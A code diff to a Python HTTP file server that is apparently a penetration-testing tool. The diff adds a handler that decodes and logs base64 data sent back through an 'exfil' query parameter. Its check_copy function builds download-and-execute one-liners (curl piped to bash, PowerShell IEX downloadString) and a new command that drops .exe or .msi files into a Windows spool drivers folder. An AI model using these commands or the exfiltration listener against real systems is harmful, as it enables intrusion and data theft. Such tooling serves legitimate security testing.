@@ -4,6 +4,7 @@ __all__ = [
     "SimpleHTTPRequestHandler",
 ]
 
+import base64
 import contextlib
 import datetime
 import email.utils
@@ -19,9 +20,10 @@ import socketserver
 import ssl
 import sys
 import time
-import urllib.parse
+import urllib
 from functools import partial
 from http import HTTPStatus
+from urllib.parse import urlparse, parse_qs
 
 from binaryornot.check import is_binary
 
@@ -30,7 +32,7 @@ from core.constants import DEFAULT_PORT, DEFAULT_BIND
 from core.log import log_normal, set_global_verbose, log_verbose, YELLOW, NO_COLOR, log_error, is_verbose_mode, ask, \
     log_success
 from core.ssl_util import cert_gen
-from core.util import get_available_port
+from core.util import get_available_port, is_b64
 
 
 # Default error message template
@@ -110,7 +112,6 @@ class BaseHTTPRequestHandler(socketserver.StreamRequestHandler):
         try:
             self.headers = http.client.parse_headers(self.rfile,
                                                      _class=self.MessageClass)
-
             self.post_data = None
             if self.headers['Content-Length']:
                 content_length = int(self.headers['Content-Length'])
@@ -272,6 +273,15 @@ class BaseHTTPRequestHandler(socketserver.StreamRequestHandler):
         self.log_message('"%s" %s %s',
                          self.requestline, str(code), str(size))
 
+        query = urlparse(self.path).query
+        exfil = parse_qs(query)
+
+        if "exfil" in exfil:
+            exfil = exfil['exfil'][0]
+            if is_b64(exfil):
+                exfil = base64.b64decode(exfil).decode()
+            log_normal(exfil.strip(), bold=True)
+
         if is_verbose_mode():
             log_normal("\n<!---------- Request Start ----------\n")
             log_normal(self.requestline)
@@ -393,7 +403,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
                     path = index
                     break
             else:
-                return self.list_directory()
+                return self.no_file_specified()
         ctype = self.guess_type(path)
 
         if path.endswith("/"):
@@ -446,7 +456,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
             f.close()
             raise
 
-    def list_directory(self):
+    def no_file_specified(self):
         enc = sys.getfilesystemencoding()
 
         encoded = json.dumps({
@@ -577,6 +587,8 @@ def check_copy(index, address):
         copy_str = f"curl -k -s {address} | bash"
     elif index.endswith(".ps1"):
         copy_str = f'IEX(New-Object Net.Webclient).downloadString("{address}")'
+    elif index.endswith(".exe") or index.endswith("msi"):
+        copy_str = f"powershell -c \"wget {address} -O \Windows\system32\spool\drivers\color\{os.path.basename(index)}\""
     else:
         copy_str = f"wget {address} -O /dev/shm/{os.path.basename(index)}"
 
